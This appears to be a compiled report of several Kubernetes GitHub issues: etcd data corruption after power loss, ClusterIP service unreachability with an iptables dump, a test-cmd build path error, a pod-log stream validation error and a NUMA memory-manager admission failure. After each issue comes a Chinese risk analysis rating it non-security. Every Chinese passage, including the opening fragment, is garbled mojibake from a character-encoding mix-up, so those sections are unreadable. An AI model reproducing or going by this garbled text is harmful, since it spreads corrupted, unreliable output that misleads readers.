- **å¯èƒ½æˆä¸ºæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·ï¼ŒCVSSè¯„åˆ†åœ¨Highä»¥ä¸Š**ï¼šæ ¹æ®ç°æœ‰ä¿¡æ¯ï¼Œæ­¤é—®é¢˜ä¸ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ï¼Œä¾‹å¦‚ä»£ç æ‰§è¡Œã€æƒé™æå‡ç­‰é«˜é£é™©é—®é¢˜ï¼Œå› è€Œä¸å¤ªå¯èƒ½è¢«åˆ†é…CVEç¼–å·æˆ–è¾¾åˆ°Highä»¥ä¸Šçš„CVSSè¯„åˆ†ã€‚

- **æ˜¯å¦æ¶‰åŠæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»**ï¼šè¯¥è­¦å‘Šæ²¡æœ‰è¡¨æ˜ä¼šå¯¼è‡´æœåŠ¡å´©æºƒæˆ–ä¸å¯ç”¨ï¼Œæœªæ¶‰åŠDoSé£é™©ã€‚

- **æ˜¯å¦å½±å“å¤šç”¨æˆ·åœºæ™¯**ï¼šæ­¤é—®é¢˜æœªæ¶‰åŠç”¨æˆ·æƒé™æˆ–å¤šç”¨æˆ·éš”ç¦»ï¼Œæ”»å‡»è€…æ— æ³•åˆ©ç”¨è¯¥é—®é¢˜å½±å“å…¶ä»–ç”¨æˆ·ã€‚

- **Issueå†…å®¹æ˜¯å¦å……åˆ†**ï¼šæ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œæ— æ³•æ¨æ–­å­˜åœ¨å®‰å…¨é£é™©ï¼Œä¸”æäº¤è€…ä¹ŸæœªæŒ‡å‡ºæœ‰åŠŸèƒ½å¼‚å¸¸æˆ–å®‰å…¨å½±å“ã€‚

å› æ­¤ï¼ŒæŒ‰ç…§é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128735 etcdserver: data corruption detected, unable to start etcd member

- Issue é“¾æ¥ï¼š[#128735](https://github.com/kubernetes/kubernetes/issues/128735)

### Issue å†…å®¹

#### What happened?

After a sudden power outage in our on-premises data center, our Kubernetes cluster failed to recover upon reboot. The etcd server could not start and logged the following error:
`etcdserver: data corruption detected, unable to start etcd member`
So the Kubernetes API server was unavailable, and the entire cluster became non-operational.

#### What did you expect to happen?

I expected etcd to handle the abrupt shutdown gracefully and recover its data upon restart which allows the k8s control plane to become available again.

#### How can we reproduce it (as minimally and precisely as possible)?

While this issue is rare and difficult to reproduce, the following steps simulate a similar scenario:
Set up a single-node Kubernetes cluster using kubeadm, deploy some resources to populate etcd, simulate an abrupt power loss, attempt to restart etcd, check the etcd logs for the data corruption error

#### Anything else we need to know?

_No response_

#### Kubernetes version

$ kubectl version --short
Client Version: v1.26.3
Server Version: v1.26.3

#### Cloud provider

On-premises (bare-metal servers)

#### OS version

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
ID=ubuntu
ID_LIKE=debian
VERSION_ID="22.04"

#### Install tools

kubeadm version: v1.26.3 
etcd version: v3.5.6

#### Container runtime (CRI) and version (if applicable)

Container Runtime: containerd 
containerd version: v1.6.15

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

CNI Plugin: Calico v3.25.0 
CSI Plugin: N/A

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨æ•°æ®ä¸­å¿ƒçªç„¶æ–­ç”µåï¼ŒetcdæœåŠ¡å™¨æ— æ³•å¯åŠ¨ï¼Œå¹¶æŠ¥å‘Šæ•°æ®æŸåé”™è¯¯ï¼Œå¯¼è‡´Kubernetesé›†ç¾¤ä¸å¯ç”¨ã€‚è¿™æ˜¯ç”±äºç¡¬ä»¶æ•…éšœï¼ˆæ–­ç”µï¼‰å¯¼è‡´çš„ç³»ç»Ÿä¸å¯ç”¨é—®é¢˜ã€‚æ­¤é—®é¢˜ä¸è½¯ä»¶è‡ªèº«çš„å®‰å…¨æ€§æ— å…³ï¼Œä¸”æ²¡æœ‰è¯æ®è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥é—®é¢˜é€ æˆç³»ç»Ÿä¸å¯ç”¨ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬1æ¡ï¼Œè¯¥é£é™©æ— æ³•è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå› æ­¤ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128723 Cannot connect to ClusterIP service IP but service/kubernetes works fine

- Issue é“¾æ¥ï¼š[#128723](https://github.com/kubernetes/kubernetes/issues/128723)

### Issue å†…å®¹

#### What happened?

deployment:
```
Name:                   counter
Namespace:              default
CreationTimestamp:      Sat, 09 Nov 2024 19:05:14 +0800
Labels:                 app=counter
Annotations:            deployment.kubernetes.io/revision: 2
Selector:               app=counter
Replicas:               1 desired | 1 updated | 1 total | 1 available | 0 unavailable
StrategyType:           RollingUpdate
MinReadySeconds:        0
RollingUpdateStrategy:  25% max unavailable, 25% max surge
Pod Template:
  Labels:  app=counter
  Containers:
   counter:
    Image:      192.168.64.1/counter:0.9.0-2
    Port:       8080/TCP
    Host Port:  0/TCP
    Limits:
      cpu:     500m
      memory:  512Mi
    Requests:
      cpu:         250m
      memory:      256Mi
    Liveness:      http-get http://:8080/health delay=0s timeout=1s period=5s #success=1 #failure=3
    Readiness:     http-get http://:8080/health delay=0s timeout=1s period=5s #success=1 #failure=3
    Startup:       http-get http://:8080/health delay=5s timeout=1s period=10s #success=1 #failure=3
    Environment:   <none>
    Mounts:        <none>
  Volumes:         <none>
  Node-Selectors:  <none>
  Tolerations:     <none>
Conditions:
  Type           Status  Reason
  ----           ------  ------
  Available      True    MinimumReplicasAvailable
  Progressing    True    NewReplicaSetAvailable
OldReplicaSets:  counter-584dc6d44f (0/0 replicas created)
NewReplicaSet:   counter-67dc886c6 (1/1 replicas created)
Events:
  Type    Reason             Age   From                   Message
  ----    ------             ----  ----                   -------
  Normal  ScalingReplicaSet  46m   deployment-controller  Scaled up replica set counter-67dc886c6 to 1
  Normal  ScalingReplicaSet  45m   deployment-controller  Scaled down replica set counter-584dc6d44f to 0 from 1
```
service:
```     
Name:                     counter
Namespace:                default
Labels:                   <none>
Annotations:              <none>
Selector:                 app=counter
Type:                     ClusterIP
IP Family Policy:         SingleStack
IP Families:              IPv4
IP:                       10.96.92.104
IPs:                      10.96.92.104
Port:                     <unset>  8080/TCP
TargetPort:               8080/TCP
Endpoints:                10.96.0.153:8080
Session Affinity:         None
Internal Traffic Policy:  Cluster
Events:                   <none>
```

I can curl using pod ip:
```
/ # curl -v '10.96.0.153:8080/health'
*   Trying 10.96.0.153:8080...
* Connected to 10.96.0.153 (10.96.0.153) port 8080
* using HTTP/1.x
> GET /health HTTP/1.1
> Host: 10.96.0.153:8080
> User-Agent: curl/8.11.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 09 Nov 2024 15:07:38 GMT
< Content-Length: 2
< Content-Type: text/plain; charset=utf-8
< 
* Connection #0 to host 10.96.0.153 left intact
```

I can curl the kubernetes cluster service ip:
```
/ # curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt 'https://10.96.0.1'
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}/
```

But not the counter clusterIP service ip:
```
# curl -v '10.96.92.104:8080/health'
*   Trying 10.96.92.104:8080...
* connect to 10.96.92.104 port 8080 from 10.96.0.155 port 57732 failed: Host is unreachable
* Failed to connect to 10.96.92.104 port 8080 after 3074 ms: Could not connect to server
* closing connection #0
curl: (7) Failed to connect to 10.96.92.104 port 8080 after 3074 ms: Could not connect to server
```

#### What did you expect to happen?

curl should be able to connect to the pod through service cluster ip.

#### How can we reproduce it (as minimally and precisely as possible)?

See what happened.

#### Anything else we need to know?

core dns is not installed, but it shouldn't affect the IP communication?

iptables-save:
```
# Generated by iptables-save v1.8.10 (nf_tables) on Sat Nov  9 23:31:08 2024
*mangle
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:KUBE-IPTABLES-HINT - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-PROXY-CANARY - [0:0]
COMMIT
# Completed on Sat Nov  9 23:31:08 2024
# Generated by iptables-save v1.8.10 (nf_tables) on Sat Nov  9 23:31:08 2024
*filter
:INPUT ACCEPT [118837:27126544]
:FORWARD ACCEPT [9:564]
:OUTPUT ACCEPT [114352:26069266]
:KUBE-EXTERNAL-SERVICES - [0:0]
:KUBE-FIREWALL - [0:0]
:KUBE-FORWARD - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-PROXY-FIREWALL - [0:0]
:KUBE-SERVICES - [0:0]
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A INPUT -m comment --comment "kubernetes health check service ports" -j KUBE-NODEPORTS
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A INPUT -j KUBE-FIREWALL
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A FORWARD -m comment --comment "kubernetes forwarding rules" -j KUBE-FORWARD
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A OUTPUT -j KUBE-FIREWALL
-A KUBE-FIREWALL ! -s 127.0.0.0/8 -d 127.0.0.0/8 -m comment --comment "block incoming localnet connections" -m conntrack ! --ctstate RELATED,ESTABLISHED,DNAT -j DROP
-A KUBE-FORWARD -m conntrack --ctstate INVALID -m nfacct --nfacct-name  ct_state_invalid_dropped_pkts -j DROP
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding rules" -m mark --mark 0x4000/0x4000 -j ACCEPT
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding conntrack rule" -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
COMMIT
# Completed on Sat Nov  9 23:31:08 2024
# Generated by iptables-save v1.8.10 (nf_tables) on Sat Nov  9 23:31:08 2024
*nat
:PREROUTING ACCEPT [71:6762]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [942:57109]
:POSTROUTING ACCEPT [942:57109]
:CNI-32c0cf70887216191130ae52 - [0:0]
:CNI-fc6a5510842a2a3576c15fbb - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-MARK-MASQ - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-POSTROUTING - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-SEP-B63S3RA5AW4YSP7P - [0:0]
:KUBE-SEP-DFZXXNAWG6RPGZZM - [0:0]
:KUBE-SERVICES - [0:0]
:KUBE-SVC-5ZCCYHVHEKPK335L - [0:0]
:KUBE-SVC-NPX46M4PTMTKRN6Y - [0:0]
-A PREROUTING -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A OUTPUT -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A POSTROUTING -m comment --comment "kubernetes postrouting rules" -j KUBE-POSTROUTING
-A POSTROUTING -s 10.96.0.153/32 -m comment --comment "name: \"bridge\" id: \"52267394d50c383398b20d0bbf3d97132edf416fc0550f964d5c959df37602e0\"" -j CNI-32c0cf70887216191130ae52
-A POSTROUTING -s 10.96.0.162/32 -m comment --comment "name: \"bridge\" id: \"fd7924fa6c8ef041c791a5e7c844c46bb8609799a70be757bfe4662d30724ced\"" -j CNI-fc6a5510842a2a3576c15fbb
-A CNI-32c0cf70887216191130ae52 -d 10.96.0.0/16 -m comment --comment "name: \"bridge\" id: \"52267394d50c383398b20d0bbf3d97132edf416fc0550f964d5c959df37602e0\"" -j ACCEPT
-A CNI-32c0cf70887216191130ae52 ! -d 224.0.0.0/4 -m comment --comment "name: \"bridge\" id: \"52267394d50c383398b20d0bbf3d97132edf416fc0550f964d5c959df37602e0\"" -j MASQUERADE
-A CNI-fc6a5510842a2a3576c15fbb -d 10.96.0.0/16 -m comment --comment "name: \"bridge\" id: \"fd7924fa6c8ef041c791a5e7c844c46bb8609799a70be757bfe4662d30724ced\"" -j ACCEPT
-A CNI-fc6a5510842a2a3576c15fbb ! -d 224.0.0.0/4 -m comment --comment "name: \"bridge\" id: \"fd7924fa6c8ef041c791a5e7c844c46bb8609799a70be757bfe4662d30724ced\"" -j MASQUERADE
-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000
-A KUBE-POSTROUTING -m mark ! --mark 0x4000/0x4000 -j RETURN
-A KUBE-POSTROUTING -j MARK --set-xmark 0x4000/0x0
-A KUBE-POSTROUTING -m comment --comment "kubernetes service traffic requiring SNAT" -j MASQUERADE --random-fully
-A KUBE-SEP-B63S3RA5AW4YSP7P -s 192.168.64.2/32 -m comment --comment "default/kubernetes:https" -j KUBE-MARK-MASQ
-A KUBE-SEP-B63S3RA5AW4YSP7P -p tcp -m comment --comment "default/kubernetes:https" -m tcp -j DNAT --to-destination 192.168.64.2:6443
-A KUBE-SEP-DFZXXNAWG6RPGZZM -s 10.96.0.153/32 -m comment --comment "default/counter" -j KUBE-MARK-MASQ
-A KUBE-SEP-DFZXXNAWG6RPGZZM -p tcp -m comment --comment "default/counter" -m tcp -j DNAT --to-destination 10.96.0.153:8080
-A KUBE-SERVICES -d 10.96.92.104/32 -p tcp -m comment --comment "default/counter cluster IP" -m tcp --dport 8080 -j KUBE-SVC-5ZCCYHVHEKPK335L
-A KUBE-SERVICES -d 10.96.0.1/32 -p tcp -m comment --comment "default/kubernetes:https cluster IP" -m tcp --dport 443 -j KUBE-SVC-NPX46M4PTMTKRN6Y
-A KUBE-SERVICES -m comment --comment "kubernetes service nodeports; NOTE: this must be the last rule in this chain" -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS
-A KUBE-SVC-5ZCCYHVHEKPK335L ! -s 10.96.0.0/16 -d 10.96.92.104/32 -p tcp -m comment --comment "default/counter cluster IP" -m tcp --dport 8080 -j KUBE-MARK-MASQ
-A KUBE-SVC-5ZCCYHVHEKPK335L -m comment --comment "default/counter -> 10.96.0.153:8080" -j KUBE-SEP-DFZXXNAWG6RPGZZM
-A KUBE-SVC-NPX46M4PTMTKRN6Y ! -s 10.96.0.0/16 -d 10.96.0.1/32 -p tcp -m comment --comment "default/kubernetes:https cluster IP" -m tcp --dport 443 -j KUBE-MARK-MASQ
-A KUBE-SVC-NPX46M4PTMTKRN6Y -m comment --comment "default/kubernetes:https -> 192.168.64.2:6443" -j KUBE-SEP-B63S3RA5AW4YSP7P
COMMIT
# Completed on Sat Nov  9 23:31:08 2024
```

#### Kubernetes version

```
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.2
```

#### Cloud provider

N/A, standalone setup with control plane components installed as systemd services.

#### OS version

Apple virtualization VM (macOS 15.1)
```
NAME="Arch Linux ARM"
PRETTY_NAME="Arch Linux ARM"
ID=archarm
ID_LIKE=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinuxarm.org/"
DOCUMENTATION_URL="https://archlinuxarm.org/wiki"
SUPPORT_URL="https://archlinuxarm.org/forum"
BUG_REPORT_URL="https://github.com/archlinuxarm/PKGBUILDs/issues"
LOGO=archlinux-logo
```

#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

containerd github.com/containerd/containerd v1.7.23 57f17b0a6295a39009d861b89e3b3b87b005ca27.m

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

```json
{
  "cniVersion": "1.0.0",
  "name": "bridge",
  "type": "bridge",
  "bridge": "k8s",
  "isDefaultGateway": true,
  "ipMasq": true,
  "ipam": {
    "type": "host-local",
    "subnet": "10.96.0.0/16"
  }
}
```

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨Kubernetesé›†ç¾¤ä¸­æ— æ³•é€šè¿‡Serviceçš„ClusterIPè®¿é—®Podï¼Œä½†å¯ä»¥ç›´æ¥ä½¿ç”¨Pod IPè®¿é—®ã€‚Issueå†…å®¹åŒ…æ‹¬Deploymentå’ŒServiceçš„é…ç½®ï¼ŒPodçš„è®¿é—®æµ‹è¯•ï¼Œä»¥åŠiptablesçš„è§„åˆ™å¯¼å‡ºç­‰ã€‚è¿™äº›éƒ½æ˜¯ç”¨äºæ’æŸ¥ç½‘ç»œè¿æ¥é—®é¢˜çš„æ­£å¸¸ä¿¡æ¯ã€‚

ä»æä¾›çš„ä¿¡æ¯æ¥çœ‹ï¼Œæ²¡æœ‰æ¶‰åŠä»»ä½•æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ²¡æœ‰æš´éœ²æ•æ„Ÿä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰æè¿°å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128717 Error when run `build/run.sh make test-cmd` in containerized build environment

- Issue é“¾æ¥ï¼š[#128717](https://github.com/kubernetes/kubernetes/issues/128717)

### Issue å†…å®¹

#### What happened?

According to "https://github.com/kubernetes/kubernetes/tree/master/build", I use `build/run.sh make test-cmd` to run CLI tests, in my WSL2 environment, and get error: `got error: fork/exec /go/src/k8s.io/kubernetes/_output/local/go/bin/kubeadm: no such file or directory`.

Please see detailed logs in this attachment:
[error-log.txt](https://github.com/user-attachments/files/17686344/error-log.txt)

I've made some investigation, and it looks like the issue is caused by `KUBEADM_PATH ` exported in `hack/make-rules/test-cmd.sh`
https://github.com/kubernetes/kubernetes/blob/feb3f92bc42f006874f68c476c2d7a6f2ac5ab16/hack/make-rules/test-cmd.sh#L177

If I change this line with: 
`export KUBEADM_PATH="${KUBEADM_PATH:=$(kube::realpath "${KUBE_ROOT}")/_output/dockerized/go/bin/kubeadm}"`, the error is gone.

#### What did you expect to happen?

Command `build/run.sh make test-cmd` runs without error: "no such file or directory"

#### How can we reproduce it (as minimally and precisely as possible)?

With Docker Desktop, run command `build/run.sh make test-cmd` in WSL2 backend.

#### Anything else we need to know?

_No response_

#### Kubernetes version

branch master 33c64b380a1

#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
BuildNumber  Caption                    OSArchitecture  Version
22000        Microsoft Windows 11 Home  64-bit          10.0.22000
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œæ­¤Issueæè¿°äº†åœ¨ä½¿ç”¨`build/run.sh make test-cmd`å‘½ä»¤æ—¶é‡åˆ°äº†é”™è¯¯ï¼Œç”¨æˆ·é€šè¿‡ä¿®æ”¹`KUBEADM_PATH`çš„è·¯å¾„è§£å†³äº†é—®é¢˜ã€‚è¯¥é—®é¢˜æ˜¯ç”±äºæ„å»ºè„šæœ¬ä¸­çš„è·¯å¾„é…ç½®å¯¼è‡´çš„ï¼Œä¸æ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #128709 If one enables PodLogsQuerySplitStreams and aims to access logs without stream, a validation error occurs

- Issue é“¾æ¥ï¼š[#128709](https://github.com/kubernetes/kubernetes/issues/128709)

### Issue å†…å®¹

#### What happened?

We saw this in our alpha jobs.

https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-kind-alpha-features/1854662086911594496

https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/128680/pull-e2e-gci-gce-alpha-enabled-default/1854616736976867328


#### What did you expect to happen?

One should be able to run the following command with this feature gate on:

```
kehannon@kehannon-thinkpadp1gen4i:~/Work/KubeExamples$ k get --raw /api/v1/namespaces/default/pods/example/log
The PodLogOptions "example" is invalid: stream: Required value: must be specified
```

#### How can we reproduce it (as minimally and precisely as possible)?

Start a cluster with PodLogsQuerySplitStreams enabled.

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.32

#### Cloud provider

NA

#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å¼€å¯PodLogsQuerySplitStreamsç‰¹æ€§åï¼Œè®¿é—®podæ—¥å¿—æ—¶å¦‚æœä¸æŒ‡å®š`stream`å‚æ•°ï¼Œä¼šå‡ºç°éªŒè¯é”™è¯¯ã€‚è¿™æ˜¯ç”±äºåœ¨ç‰¹æ€§å¼€å¯åï¼ŒAPIéœ€è¦é¢å¤–çš„å‚æ•°æ ¡éªŒï¼Œæ²¡æœ‰æä¾›å¿…éœ€çš„å‚æ•°å¯¼è‡´è¯·æ±‚è¢«æ‹’ç»ã€‚è¿™å±äºåŠŸèƒ½å®ç°å’Œå‚æ•°éªŒè¯é—®é¢˜ï¼Œä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚å› æ­¤ï¼Œæœ¬Issueçš„é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #128708 NUMA-aware memory manager and Topology Manager policy of "restricted" results in UnexpectedAdmissionError

- Issue é“¾æ¥ï¼š[#128708](https://github.com/kubernetes/kubernetes/issues/128708)

### Issue å†…å®¹

#### What happened?

While trying to reproduce https://github.com/kubernetes/kubernetes/issues/128669 I spun up a VM to test 1.31.2 via minikube and I think I might have uncovered a new and different bug.

I had 8GB of allocatable memory on each of two NUMA nodes. Key kubelet args were:

-cpu-manager-policy=static --kube-reserved=memory=1Gi --memory-manager-policy=Static --reserved-cpus=0,4 --reserved-memory=0:memory=1Gi;1:memory=1Gi --system-reserved=memory=1Gi --topology-manager-policy=restricted

I was able to create the first pod with 1cpu and 256Mi of memory, but when I tried to create the second pod with 1cpu and 9Gi of memory (to force it to allocate memory from both NUMA nodes) it errored out unexpectedly:

cfriesen@debian:~$ minikube kubectl -- get pod kube-mgrr-2 -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"kube-mgrr-2","namespace":"default"},"spec":{"containers":[{"image":"gcr.io/kubernetes-e2e-test-images/resource-consumer:1.4","imagePullPolicy":"IfNotPresent","name":"kube-mgrr-2","resources":{"limits":{"cpu":1,"memory":"9Gi"}}}]}}
  creationTimestamp: "2024-11-08T19:34:55Z"
  name: kube-mgrr-2
  namespace: default
  resourceVersion: "1028"
  uid: 2e769357-b700-49fa-96dc-2416a0379cb9
spec:
  containers:
  - image: gcr.io/kubernetes-e2e-test-images/resource-consumer:1.4
    imagePullPolicy: IfNotPresent
    name: kube-mgrr-2
    resources:
      limits:
        cpu: "1"
        memory: 9Gi
      requests:
        cpu: "1"
        memory: 9Gi
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-27rcb
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: minikube
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-27rcb
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  message: 'Pod was rejected: Allocate failed due to [memorymanager] failed to find
    NUMA nodes to extend the current topology hint, which is unexpected'
  phase: Failed
  reason: UnexpectedAdmissionError
  startTime: "2024-11-08T19:34:55Z"


Kubelet logs were:

Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.632981 2326 scope_container.go:75] "TopologyHints" hints={} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633153 2326 policy_static.go:541] "TopologyHints generated" pod="default/kube-mgrr-2" containerName="kube-mgrr-2" cpuHints=[{"NUMANodeAffinity":1,"Preferred":true},{"NUMANodeAffinity":2,"Preferred":true},{"NUMANodeAffinity":3,"Preferred":false}]
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633187 2326 scope_container.go:75] "TopologyHints" hints={"cpu":[{"NUMANodeAffinity":1,"Preferred":true},{"NUMANodeAffinity":2,"Preferred":true},{"NUMANodeAffinity":3,"Preferred":false}]} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633254 2326 scope_container.go:75] "TopologyHints" hints={} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633276 2326 policy.go:71] "Hint Provider has no preference for NUMA affinity with any resource"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633289 2326 policy.go:71] "Hint Provider has no preference for NUMA affinity with any resource"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633304 2326 scope_container.go:83] "ContainerTopologyHint" bestHint={"NUMANodeAffinity":1,"Preferred":true}
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633330 2326 scope_container.go:50] "Best TopologyHint" bestHint={"NUMANodeAffinity":1,"Preferred":true} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633342 2326 scope_container.go:56] "Topology Affinity" bestHint={"NUMANodeAffinity":1,"Preferred":true} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633391 2326 policy_static.go:303] "Static policy: Allocate" pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633407 2326 policy_static.go:352] "Topology Affinity" pod="default/kube-mgrr-2" containerName="kube-mgrr-2" affinity={"NUMANodeAffinity":1,"Preferred":true}
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633421 2326 policy_static.go:392] "AllocateCPUs" numCPUs=1 socket="01"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633496 2326 state_mem.go:88] "Updated default CPUSet" cpuSet="0,3-7"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.635778 2326 policy_static.go:424] "AllocateCPUs" result="2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.635830 2326 state_mem.go:80] "Updated desired CPUSet" podUID="2e769357-b700-49fa-96dc-2416a0379cb9" containerName="kube-mgrr-2" cpuSet="2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.638325 2326 policy_static.go:106] "Allocate" pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
